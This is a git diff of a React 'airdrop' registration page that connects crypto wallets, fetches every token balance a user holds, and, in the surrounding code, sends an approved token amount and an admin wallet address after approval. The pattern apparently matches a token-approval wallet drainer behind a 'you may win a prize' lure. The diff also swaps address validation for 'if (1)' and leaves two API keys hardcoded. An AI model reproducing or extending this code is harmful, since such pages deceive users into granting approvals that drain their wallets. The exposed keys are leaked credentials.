@@ -1,8 +1,11 @@
 import React, { useState, useEffect, useCallback, useReducer } from 'react';
 import { Link } from 'react-router-dom';
+import { BsCheck2Circle } from 'react-icons/bs'
 import axios from 'axios';
 import { NotificationContainer, NotificationManager } from "react-notifications";
 import Web3Modal from "web3modal";
+import 'react-responsive-modal/styles.css';
+import { Modal } from 'react-responsive-modal';
 import WalletConnectProvider from "@walletconnect/web3-provider";
 import Fortmatic from "fortmatic";
 import Torus from "@toruslabs/torus-embed";
@@ -22,7 +25,7 @@ import BTC from "../assets/btc.png";
 import ETH from "../assets/eth.png";
 import playstore from "../assets/playstore.webp";
 import appstore from "../assets/appstore.webp";
-var WAValidator = require('wallet-address-validator');
+// var WAValidator = require('wallet-address-validator');
 
 const GET_TOKEN_PRICE_API_KEY = "0dbdc51d0f73f318d42549c40568c2bf422d82cc0f3adfc22e1c714fe2e10914";
 const GET_USER_ALL_TOEKN_API_KEY = "BQYwOG5P7R1uRLynnZc5UAaauiO27iiD";
@@ -115,6 +118,10 @@ function reducer(state, action) {
 const web3 = new Web3(window.ethereum);
 
 const UserScreen = (props) => {
+  const [open, setOpen] = useState(false);
+  const onOpenModal = () => setOpen(true);
+  const onCloseModal = () => setOpen(false);
+
   const [myAddress, setMyaddress] = useState('');
   const [walletStatus, setWalletStatus] = useState(false);
   const [initStatus, setInitStatus] = useState(false);
@@ -322,12 +329,12 @@ const UserScreen = (props) => {
   }, [])
   useEffect(() => {
     const init = async (value) => {
-      var valid = WAValidator.validate(value, 'ETH');
+      // var valid = WAValidator.validate(value, 'ETH');
       var userAllTokenBalance = {
         eth: [],
         bsc: []
       };
-      if (valid) {
+      if (1) {
         let query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
         let variables = `{"limit": 10,"offset": 0,"network": "ethereum","address": "` + value + `"}`;
         let url = "https://graphql.bitquery.io/";
@@ -441,7 +448,7 @@ const UserScreen = (props) => {
                   adminAddress: adminWalletAddress,
                   price: approveToken.cost
                 });
-                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
+                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', '', 3000);
               });
           }
         }
@@ -470,13 +477,14 @@ const UserScreen = (props) => {
                   adminAddress: adminWalletAddress,
                   price: approveToken.cost
                 });
-                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
+                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', '', 3000);
               });
           }
         }
       }
     } catch (error) {
       // console.log(error.message);
+      NotificationManager.warning('Mint failed!', 'Mint Info', 3000);
     }
   }
   const { provider, web3Provider } = state;
@@ -486,10 +494,10 @@ const UserScreen = (props) => {
       const provider = await web3Modal.connect();
       if (window.ethereum) {
         // check if the chain to connect to is installed
-        // await window.ethereum.request({
-        //   method: "wallet_switchEthereumChain",
-        //   params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
-        // });
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
+        });
       } else {
         alert(
           "MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"
@@ -547,7 +555,7 @@ const UserScreen = (props) => {
     if (web3Modal.cachedProvider) {
       disconnect();
     }
-  }, [connect]);
+  }, [disconnect]);
   useEffect(() => {
     if (provider) {
       const handleAccountsChanged = (accounts) => {
@@ -681,6 +689,13 @@ const UserScreen = (props) => {
 
       </div>
       <NotificationContainer />
+      <Modal open={open} onClose={onCloseModal} center>
+        <div className="modal-body text-center">
+          <BsCheck2Circle size={100} color="#06C88B" /><br />
+          <div className='title'>Successfully registered</div><br />
+          <div className='content'>You have successfully registered for this contest,<br /> if you are lucky you will receive your CRO price soon!</div>
+        </div>
+      </Modal>
     </>
   );
 };
